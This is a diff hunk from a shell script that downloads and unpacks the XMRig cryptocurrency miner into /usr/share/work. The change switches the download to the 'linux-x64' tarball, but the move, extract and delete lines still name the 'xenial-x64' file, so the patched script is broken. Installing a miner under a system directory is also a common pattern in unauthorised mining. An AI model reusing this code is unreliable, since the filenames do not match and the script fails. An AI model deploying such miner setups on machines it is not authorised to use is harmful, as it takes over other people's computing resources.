@@ -9,7 +9,7 @@ apt-get install -y git wget screen
 mkdir /usr/share
 mkdir /usr/share/work
 rm -r /usr/share/work/xmrig-$VERSION
-wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz
 mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
 cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
 rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
